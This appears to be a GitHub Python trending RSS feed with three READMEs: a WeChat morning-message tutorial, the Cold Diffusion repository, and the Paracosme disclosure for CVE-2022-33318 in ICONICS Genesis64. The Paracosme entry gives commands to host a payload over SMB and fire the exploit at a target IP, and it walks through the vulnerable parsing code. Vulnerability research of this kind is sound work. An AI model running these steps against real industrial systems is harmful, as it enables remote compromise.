<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-25T01:44:43Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>13812851221/-rxrw-daily_morning</title>
    <updated>2022-08-25T01:44:43Z</updated>
    <id>tag:github.com,2022-08-25:/13812851221/-rxrw-daily_morning</id>
    <link href="https://github.com/13812851221/-rxrw-daily_morning" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;每日早安推送给别人家的女朋友&lt;/h1&gt; &#xA;&lt;p&gt;首发在小红书，但是有大家说字看不清，因此在这里搞一篇使用说明。&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;我一脸懵逼地在小红书新建的群里听说有网友在抖音帮推我这个项目..&lt;/p&gt; &#xA; &lt;p&gt;在此表示十分感谢，因为我懒得做视频。。当时也是一时兴起，所以就只发了小红书。。&lt;/p&gt; &#xA; &lt;p&gt;大家喜欢我的项目我真的十分感谢，不过有朋友说找不到我本人。对于涨粉丝这件事情我还是很感兴趣的。。&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;em&gt;我的小红书昵称==抖音昵称==微博账号==一切社交平台==“纠结当道”&lt;/em&gt;&lt;/p&gt; &#xA;&lt;p&gt;并且都是柯南的头像&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/9566402/185802023-1f28c90a-40e7-446e-8dad-420c83f83e38.jpeg&#34; alt=&#34;WechatIMG1&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/185802026-ef7c1b99-66a8-4535-a6a4-804677657667.jpeg&#34; alt=&#34;WechatIMG2&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;---------------------- 以下是正文 ----------------------&lt;/p&gt; &#xA;&lt;p&gt;在我刚想构思这个教程怎么让不懂编程的朋友很快入门的时候，我考虑到：避免服务器搭建，避免定时任务，避免接触代码。在经历过各种思考后，觉得可以用 Github Actions 来白嫖。。&lt;/p&gt; &#xA;&lt;p&gt;效果如图。当然，文字是可以修改的。 &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242263-c93517a2-5377-435d-8386-8d47252c9e07.jpg&#34; alt=&#34;5e72e89fd7ff692a0bfa62010517c0c&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;首先，按图搜索，测试号，进来之后微信扫码登录！ &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242272-134e37e7-718d-42dd-9ed7-fca2810e94e6.png&#34; alt=&#34;cf7dbd4502df44765ed3506f55caea5&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;按图点击 Use this template，创建到自己的仓库下！ &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242340-2ef26c63-1ca1-420e-abd4-8672c25d61c9.png&#34; alt=&#34;e6581c43572b00b12c1a82ca8d7178b&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;按下图，创建模板，设置变量，把微信公众平台上的各种字符串按说明创建到 GitHub -&amp;gt; Settings -&amp;gt; Secrets -&amp;gt; Actions 中。 &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242301-fd6ab30e-bfe5-4245-b2a9-f690184db307.png&#34; alt=&#34;71bf9d11a876d23ef0f0728645a8ba0&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242295-4dcf06bb-2083-4883-8745-0af753ca805c.png&#34; alt=&#34;381e8ee4a7c5ec6b8c09719f2c7e486&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242320-18500adc-14e5-4522-a3ad-ae19cc4479bf.png&#34; alt=&#34;48c60750cec7adc546e0ad99e3082b3&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;启用自己项目下的 Action！ &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242334-9943c538-ba3d-4d01-8377-d040143b7560.png&#34; alt=&#34;30a5b1b2b06ba4a40a3d8ef01652409&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;如果运行出现错误，按以下方法可以看到错误，在这里 issue 提问也可以，在小红书群里问也可以 &lt;img src=&#34;https://user-images.githubusercontent.com/9566402/183242349-1aa5ada6-2ee7-4cf9-a542-4b2dad88b8fe.png&#34; alt=&#34;6b0da6f44e18c2bfd94910c377d13e6&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;启用后可以直接运行，看看女朋友的手机有没有收到推送吧！ 这个定时任务是每天早晨8点推送，如果会编程的同学可以自己自定义一些东西～&lt;/p&gt; &#xA;&lt;p&gt;图中的操作，除了各种英文字符串不一样，模板消息中的中文不一样，其他的应该都是一样的，不然程序跑不通的～&lt;/p&gt; &#xA;&lt;p&gt;Github 的右上角可以点击 star 给我点鼓励吧亲&lt;/p&gt; &#xA;&lt;p&gt;小红书上点点关注，点点赞，有什么好玩的东西可以at我，我来教你们做&lt;/p&gt; &#xA;&lt;p&gt;ps. 有一些注意事项在此补充&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;第一次登录微信公众平台测试号给的 app secret 是错误的，刷新一下页面即可&lt;/li&gt; &#xA; &lt;li&gt;生日的日期格式是：&lt;code&gt;05-20&lt;/code&gt;，纪念日的格式是 &lt;code&gt;2022-08-09&lt;/code&gt;，请注意区分。城市请写到地级市，比如：&lt;code&gt;北京&lt;/code&gt;，&lt;code&gt;广州&lt;/code&gt;，&lt;code&gt;承德&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;变量中粘贴的各种英文字符串不要有空格，不要有换行，除了模板之外都没有换行&lt;/li&gt; &#xA; &lt;li&gt;Github Actions 的定时任务，在 workflow 的定义是 &lt;code&gt;0 0 * * *&lt;/code&gt;，是 UTC 时间的零点，北京时间的八点。但是由于 Github 同一时间任务太多，因此会有延迟&lt;/li&gt; &#xA; &lt;li&gt;我会偶尔优化一下代码，emm 但现在我自己在做一个完整的平台项目，想让大家更加便捷地上手&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;但那个平台还没完全做好，我要抑制住我赚钱（不是）的欲望。。&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>arpitbansal297/Cold-Diffusion-Models</title>
    <updated>2022-08-25T01:44:43Z</updated>
    <id>tag:github.com,2022-08-25:/arpitbansal297/Cold-Diffusion-Models</id>
    <link href="https://github.com/arpitbansal297/Cold-Diffusion-Models" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Official implementation of Cold-Diffusion for different transformations in pytorch.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Cold Diffusion: Inverting Arbitrary Image Transforms Without Noise&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/arpitbansal297/Cold-Diffusion-Models/main/all_transform_cover.png&#34; width=&#34;1000px&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;This repository is the official PyTorch implementation of &lt;a href=&#34;https://arxiv.org/abs/2208.09392&#34;&gt;Cold-Diffusion&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Download the CelebA-HQ and AFHQ dataset. Use the following script to create data and use them as path to data for MNIST, Cifar10 and CelebA.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python create_data.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Denoise&lt;/h2&gt; &#xA;&lt;h4&gt;Training&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd denoising-diffusion-pytorch&#xA;python celebA_noise_128.py --time_steps 200 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt;&#xA;python AFHQ_noise_128.py --time_steps 200 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;sampling_routine with estimated noise&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python celebA_noise_128_test.py --time_steps 200 --sampling_routine ddim --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_sample_and_save_for_fid&#xA;python AFHQ_noise_128_test.py --time_steps 200 --sampling_routine ddim --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_sample_and_save_for_fid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;sampling_routine with fixed noise&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python celebA_noise_128_test.py --time_steps 200 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_sample_and_save_for_fid&#xA;python AFHQ_noise_128_test.py --time_steps 200 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_sample_and_save_for_fid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Deblur&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd deblurring-diffusion-pytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Transformation&lt;/h4&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python mnist_train.py --time_steps 20 --blur_size 11 --blur_std 7.0 --blur_routine &#39;Constant&#39; --sampling_routine x0_step_down --data_path &amp;lt;Path to data folder&amp;gt; --save_folder &amp;lt;Path to save model&amp;gt; &#xA;python cifar10_train.py --time_steps 50 --blur_routine &#39;Special_6_routine&#39; --sampling_routine x0_step_down --data_path &amp;lt;Path to data folder&amp;gt; --save_folder &amp;lt;Path to save model&amp;gt; &#xA;python celebA_128.py --time_steps 200 --blur_size 15 --blur_std 0.01 --blur_routine Exponential_reflect --sampling_routine x0_step_down --data_path &amp;lt;Path to data folder&amp;gt; --save_folder &amp;lt;Path to save model&amp;gt; &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Testing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python mnist_test.py --time_steps 20 --blur_size 11 --blur_std 7.0 --blur_routine &#39;Constant&#39; --sampling_routine &#39;x0_step_down&#39; --save_folder &amp;lt;Path to save results&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_data&#xA;python cifar10_test.py --time_steps 50 --blur_routine &#39;Special_6_routine&#39; --sampling_routine &#39;x0_step_down&#39; --save_folder &amp;lt;Path to save results&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_data&#xA;python celebA_128_test.py --time_steps 200 --blur_size 15 --blur_std 0.01 --blur_routine Exponential_reflect --sampling_routine x0_step_down --save_folder &amp;lt;Path to save results&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_data&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Generation&lt;/h4&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python celebA_128.py --discrete --time_steps 300 --blur_size 27 --blur_std 0.01 --blur_routine Exponential --sampling_routine x0_step_down --data_path &amp;lt;Path to data folder&amp;gt; --save_folder &amp;lt;Path to save models&amp;gt;&#xA;python AFHQ_128.py --discrete --time_steps 300 --blur_size 27 --blur_std 0.01 --blur_routine Exponential --sampling_routine x0_step_down --data_path &amp;lt;Path to data folder&amp;gt; --save_folder &amp;lt;Path to save models&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Sampling with Perfect Symmetry&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python celebA_128_test.py --gmm_cluster 1 --noise 0.000 --discrete --time_steps 300 --blur_size 27 --blur_std 0.01 --blur_routine Exponential --sampling_routine x0_step_down --save_folder &amp;lt;Path to save results&amp;gt; --load_path &amp;lt;Path to load models&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type train_distribution_mean_blur_torch_gmm_ablation&#xA;python AFHQ_128_test.py --gmm_cluster 1 --noise 0.000 --discrete --time_steps 300 --blur_size 27 --blur_std 0.01 --blur_routine Exponential --sampling_routine x0_step_down --save_folder &amp;lt;Path to save results&amp;gt; --load_path &amp;lt;Path to load models&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type train_distribution_mean_blur_torch_gmm_ablation&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Animorph&lt;/h2&gt; &#xA;&lt;h4&gt;Generation&lt;/h4&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd demixing-diffusion-pytorch&#xA;python AFHQ_128_to_celebA_128.py --time_steps 200 --sampling_routine x0_step_down --save_folder &amp;lt;path to save models&amp;gt; --data_path_start &amp;lt;Path to starting data manifold&amp;gt; --data_path_end &amp;lt;Path to ending data manifold&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Sampling&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python AFHQ_128_to_celebA_128_test.py --time_steps 200 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --data_path_start &amp;lt;Path to starting data manifold&amp;gt; --data_path_end &amp;lt;Path to ending data manifold&amp;gt; --test_type test_sample_and_save_for_fid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Inpaint&lt;/h2&gt; &#xA;&lt;h4&gt;Transformation&lt;/h4&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd defading-diffusion-pytorch&#xA;python mnist_train.py --time_steps 50 --save_folder &amp;lt;path to save models&amp;gt; --discrete --sampling_routine x0_step_down --train_steps 700000 --blur_std 0.1 --fade_routine Random_Incremental --data_path &amp;lt;Path to data folder&amp;gt;&#xA;python cifar10_train.py --time_steps 50 --save_folder &amp;lt;path to save models&amp;gt; --discrete --sampling_routine x0_step_down --train_steps 700000 --blur_std 0.1 --fade_routine Random_Incremental --data_path &amp;lt;Path to data folder&amp;gt;&#xA;python celebA_train.py --time_steps 100 --fade_routine Incremental --save_folder &amp;lt;path to save models&amp;gt; --sampling_routine x0_step_down --train_steps 350000 --kernel_std 0.2 --initial_mask 1 --image_size 128 --dataset celebA --data_path &amp;lt;Path to data folder&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Testing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python mnist_test.py --time_steps 50 --save_folder test_mnist --discrete --sampling_routine x0_step_down --kernel_std 0.1 --initial_mask 1 --image_size 28 --fade_routine Random_Incremental --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_data &#xA;python cifar10_test.py --time_steps 50 --save_folder test_cifar10 --discrete --sampling_routine x0_step_down --kernel_std 0.1 --initial_mask 1 --image_size 32 --fade_routine Random_Incremental --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_data&#xA;python celebA_test.py --time_steps 100 --fade_routine Incremental --save_folder test_celebA --sampling_routine x0_step_down --kernel_std 0.2 --initial_mask 1 --image_size 128 --dataset celebA --load_path &amp;lt;Path to load model&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --test_type test_data&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Generation&lt;/h4&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd defading-generation-diffusion-pytorch&#xA;python celebA_128.py --reverse --kernel_std 0.05 --initial_mask 1 --time_steps 750 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save models&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Sampling&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python celebA_constant_128_test.py --noise 0 --reverse --kernel_std 0.05 --initial_mask 1 --time_steps 750 --sampling_routine x0_step_down --save_folder &amp;lt;Path to save images&amp;gt; --data_path &amp;lt;Path to data folder&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --test_type test_sample_and_save_for_fid&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Super-Resolution&lt;/h2&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd resolution-diffusion-pytorch&#xA;python mnist_train.py --time_steps 3 --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save models&amp;gt;&#xA;python cifar10_train.py --time_steps 3 --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save models&amp;gt;&#xA;python celebA_128.py --time_steps 4 --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save models&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Testing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python mnist_test.py --time_steps 3 --train_routine &#39;Final&#39; --sampling_routine &#39;x0_step_down&#39; --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --test_type test_data&#xA;python cifar10_test.py --time_steps 3 --train_routine &#39;Final&#39; --sampling_routine &#39;x0_step_down&#39; --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --test_type test_data&#xA;python celebA_test.py --time_steps 4 --train_routine &#39;Final&#39; --sampling_routine &#39;x0_step_down&#39; --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --test_type test_data&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Generation&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;python celebA_test.py --time_steps 4 --train_routine &#39;Final&#39; --sampling_routine &#39;x0_step_down&#39; --resolution_routine &#39;Incremental_factor_2&#39; --save_folder &amp;lt;Path to save images&amp;gt; --load_path &amp;lt;Path to load model&amp;gt; --test_type test_data&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Snowify&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd snowification&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python train.py --dataset cifar10 --time_steps 200 --forward_process_type ‘Snow’ --snow_level 3 --exp_name &amp;lt;exp_name&amp;gt;  --dataset_folder &amp;lt;path-to-dataset&amp;gt; --random_snow --fix_brightness  --sampling_routine x0_step_down&#xA;python train.py --dataset celebA --time_steps 200 --forward_process_type ‘Snow’ --snow_level 4 --exp_name &amp;lt;exp_name&amp;gt; --dataset_folder &amp;lt;path-to-dataset&amp;gt; --random_snow --fix_brightness  --sampling_routine x0_step_down&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Testing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python test.py --dataset cifar10 --time_steps 200 --forward_process_type ‘Snow’ --snow_level 3 --exp_name &amp;lt;exp_name&amp;gt; --dataset_folder &amp;lt;path-to-dataset&amp;gt; --random_snow --fix_brightness --resume_training --sampling_routine x0_step_down --test_type test_data --order_seed 1&#xA;python test.py --dataset celebA --time_steps 200 --forward_process_type ‘Snow’ --snow_level 4 --exp_name &amp;lt;exp_name&amp;gt; --dataset_folder &amp;lt;path-to-dataset&amp;gt; --random_snow --fix_brightness --resume_training --sampling_routine x0_step_down --test_type test_data --order_seed 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Colorization&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;cd decolor-diffusion&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Training&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python train.py --dataset cifar10 --time_steps 20 --forward_process_type ‘Decolorization’ --exp_name &amp;lt;exp_name&amp;gt; --decolor_total_remove --decolor_routine ‘Linear’ --dataset_folder &amp;lt;path-to-dataset&amp;gt;&#xA;python train.py --dataset celebA --time_steps 20 --forward_process_type ‘Decolorization’ --exp_name &amp;lt;exp_name&amp;gt; --decolor_total_remove --decolor_routine ‘Linear’ --dataset_folder &amp;lt;path-to-dataset&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Testing&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python test.py --dataset cifar10 --time_steps 20 --forward_process_type ‘Decolorization’ --exp_name &amp;lt;exp-name&amp;gt;  --decolor_total_remove --decolor_routine ‘Linear’ --dataset_folder &amp;lt;path-to-dataset&amp;gt; --sampling_routine x0_step_down --test_type test_data --order_seed 1&#xA;python test.py --dataset celebA --time_steps 20 --forward_process_type ‘Decolorization’ --exp_name &amp;lt;exp-name&amp;gt;  --decolor_total_remove --decolor_routine ‘Linear’ --dataset_folder &amp;lt;path-to-dataset&amp;gt; --sampling_routine x0_step_down --test_type test_data --order_seed 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Citation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bibtex&#34;&gt;@misc{bansal2022cold,&#xA;      title={Cold Diffusion: Inverting Arbitrary Image Transforms Without Noise}, &#xA;      author={Arpit Bansal and Eitan Borgnia and Hong-Min Chu and Jie S. Li and Hamid Kazemi and Furong Huang and Micah Goldblum and Jonas Geiping and Tom Goldstein},&#xA;      year={2022},&#xA;      eprint={2208.09392},&#xA;      archivePrefix={arXiv},&#xA;      primaryClass={cs.CV}&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>0vercl0k/paracosme</title>
    <updated>2022-08-25T01:44:43Z</updated>
    <id>tag:github.com,2022-08-25:/0vercl0k/paracosme</id>
    <link href="https://github.com/0vercl0k/paracosme" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Paracosme is a zero-click remote memory corruption exploit that compromises ICONICS Genesis64.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Paracosme - CVE-2022-33318 - Remote Code Execution in ICONICS Genesis64&lt;/h1&gt; &#xA;&lt;p&gt;Paracosme is a memory corruption exploit I wrote to target the &lt;a href=&#34;https://iconics.com/Products/GENESIS64&#34;&gt;Genesis64&lt;/a&gt; suite v10.97.1 made by &lt;a href=&#34;https://iconics.com/&#34;&gt;ICONICS&lt;/a&gt; to achieve remote code execution.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/pics/p2o.png&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;The exploit was demonstrated during the &lt;a href=&#34;https://www.zerodayinitiative.com/blog/2021/10/22/our-ics-themed-pwn2own-contest-returns-to-miami-in-2022&#34;&gt;Pwn2Own 2022 Miami&lt;/a&gt; contest that took place at the &lt;a href=&#34;https://s4xevents.com/&#34;&gt;S4x22 Conference&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/pics/paracosme.gif&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;The issue scored 9.8 on CVSS and was assigned &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2022-33318&#34;&gt;CVE-2022-33318&lt;/a&gt; / &lt;a href=&#34;https://www.zerodayinitiative.com/advisories/ZDI-22-1041/&#34;&gt;ZDI-22-1041&lt;/a&gt;. It was fixed and was fixed in &lt;a href=&#34;&#34;&gt;Genesis64 10.97.2&lt;/a&gt;. You can also read the &lt;a href=&#34;https://www.cisa.gov/uscert/ics/advisories/icsa-22-202-04&#34;&gt;ICSA-22-202-04&lt;/a&gt; advisory as well as ICONICS&#39; &lt;a href=&#34;https://iconics.com/Production/media/SupportFiles/CERT/Whitepaper-Security-Vulnerabilities-V10.pdf&#34;&gt;whitepaper on ICONICS Suite Security Vulnerabilities&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can find the exploit code in &lt;a href=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/src/paracosme.py&#34;&gt;src/paracosme.py&lt;/a&gt;, a PoC to trigger the crash / verify if you are affected in &lt;a href=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/src/paracosme-poc.py&#34;&gt;src/paracosme-poc.py&lt;/a&gt;, and the payload executed in the machine in &lt;a href=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/src/payload&#34;&gt;src/payload&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Am I affected?&lt;/h2&gt; &#xA;&lt;p&gt;The best way to know if you are affected is to turn on &lt;a href=&#34;https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/gflags-and-pageheap&#34;&gt;Page Heap&lt;/a&gt; for &lt;code&gt;GenBroker64.exe&lt;/code&gt;, restart the service, attach a debugger to &lt;code&gt;GenBroker64.exe&lt;/code&gt;, run &lt;a href=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/src/paracosme-poc.py&#34;&gt;paracosme-poc.py&lt;/a&gt; against your server and you should see crashes like in the below:&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/pics/paracosme-poc.gif&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;You need to attach a debugger to the target process to witness the crash otherwise the application ignores it.&lt;/p&gt; &#xA;&lt;h2&gt;Running the exploit&lt;/h2&gt; &#xA;&lt;p&gt;The exploit has been only tested on Windows but should also be working on Linux platforms:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Install &lt;code&gt;impacket&lt;/code&gt; with: &lt;code&gt;pip3 install impacket&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Turn off any SMB server running on your machine with &lt;code&gt;sc config lanmanserver start=disabled&lt;/code&gt; and reboot&lt;/li&gt; &#xA; &lt;li&gt;Start an smbserver with &lt;code&gt;smbserver.py&lt;/code&gt; (part of &lt;code&gt;impacket&lt;/code&gt;&#39;s examples) with: &lt;code&gt;python src\smbserver.py -smb2support x bin&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Start the exploit with &lt;code&gt;python src\paracosme.py --target &amp;lt;ip&amp;gt;&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/0vercl0k/paracosme/main/pics/paracosme.gif&#34;&gt; &lt;/p&gt; &#xA;&lt;h2&gt;The exploit&lt;/h2&gt; &#xA;&lt;h3&gt;Overview of the vulnerability&lt;/h3&gt; &#xA;&lt;p&gt;Paracosme exploits a use-after-free issue found in the &lt;a href=&#34;https://docs.iconics.com/V10.96.2/GENESIS64/Help/Apps/WBDT/FrameWorX/GenBroker64_Settings.htm&#34;&gt;GenBroker64&lt;/a&gt; process to achieve remote code execution on a Windows 21H2 x64 system.&lt;/p&gt; &#xA;&lt;p&gt;At a high level, the GenBroker64 process listens on the TCP port 38080 and is able to deserialize various packets after a handshake has been done with a client. The isue I found is in the code that handles reading a &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/api/oaidl/ns-oaidl-variant&#34;&gt;VARIANT&lt;/a&gt; from the network socket. Basically a variant is a type and a value. The function seems well-written at first sight, and takes efforts to only unpacks certain types. This is how it looks like:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;bool CheckVariantType(VARTYPE VarType) {&#xA;  if((VarType &amp;amp; 0x2FFF) != VarType) {&#xA;    return false;&#xA;  }&#xA;&#xA;  switch(VarType &amp;amp; 0xFFF) {&#xA;    case VT_EMPTY:&#xA;    case VT_NULL:&#xA;    case VT_I2:&#xA;    case VT_I4:&#xA;    case VT_R4:&#xA;    case VT_R8:&#xA;    case VT_CY:&#xA;    case VT_DATE:&#xA;    case VT_BSTR:&#xA;    case VT_ERROR:&#xA;    case VT_BOOL:&#xA;    case VT_VARIANT:&#xA;    case VT_I1:&#xA;    case VT_UI1:&#xA;    case VT_UI2:&#xA;    case VT_UI4:&#xA;    case VT_I8:&#xA;    case VT_UI8:&#xA;    case VT_INT:&#xA;    case VT_UINT:&#xA;    case VT_HRESULT:&#xA;    case VT_FILETIME:&#xA;      return true;&#xA;      break;&#xA;    default:&#xA;      return false;&#xA;  }&#xA;}&#xA;&#xA;size_t VariantTypeToSize(VARTYPE VarType) {&#xA;  switch(VarType) {&#xA;    case VT_I1: return 1;&#xA;    case VT_UI2: return 2;&#xA;    case VT_UI4:&#xA;    case VT_INT:&#xA;    case VT_UINT:&#xA;    case VT_HRESULT:&#xA;      return 4;&#xA;    case VT_I8:&#xA;   